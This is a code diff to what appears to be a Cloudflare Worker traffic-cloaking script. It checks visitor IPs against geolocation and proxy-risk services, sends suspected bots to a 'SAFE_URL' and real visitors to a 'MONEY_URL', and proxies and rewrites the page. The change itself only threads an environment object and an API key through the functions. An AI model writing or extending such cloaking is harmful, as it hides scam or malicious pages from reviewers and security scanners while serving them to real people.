@@ -758,10 +758,10 @@ const SAFE_URL = '${safePageUrl}';
 // --- END CONFIGURATION ---
 
 addEventListener('fetch', event => {
-  event.respondWith(handleRequest(event.request));
+  event.respondWith(handleRequest(event.request, event.env));
 });
 
-async function handleRequest(request) {
+async function handleRequest(request, env) {
   const url = new URL(request.url);
 
   // ROUTE 1: Serve the service worker script itself when the browser requests it.
@@ -803,7 +803,7 @@ self.addEventListener('fetch', event => {
     }
     
     // ROUTE 3: Handle the initial page load with cloaking logic.
-    return handleMainRequest(request);
+    return handleMainRequest(request, env);
 }
 
 // --- CORE FUNCTIONS ---
@@ -815,9 +815,9 @@ self.addEventListener('fetch', event => {
  * @param {Object} env Environment variables containing API keys.
  * @returns {Promise<boolean>} Returns true if the visitor should be blocked, false otherwise.
  */
-async function isVisitorABot(request) {
+async function isVisitorABot(request, env) {
   const clientIP = request.headers.get('CF-Connecting-IP') || '127.0.0.1';
-  const apiKey = PROXYCHECK_API_KEY || 'YOUR_PROXYCHECK_API_KEY_HERE';
+  const apiKey = env?.PROXYCHECK_API_KEY || 'demo'; // Use demo key if not provided
   const riskThreshold = 75; // Block visitors with risk score >= 75
   
   // Step 1: Country Check (ip-api.com) - Quick pre-filter
@@ -890,9 +890,9 @@ async function isVisitorABot(request) {
 }
 
 // Proxies the main HTML page and rewrites its content.
-async function handleMainRequest(request) {
+async function handleMainRequest(request, env) {
   try {
-    const isBot = await isVisitorABot(request);
+    const isBot = await isVisitorABot(request, env);
     const targetUrl = isBot ? SAFE_URL : MONEY_URL;
     
     const response = await fetch(targetUrl, request);
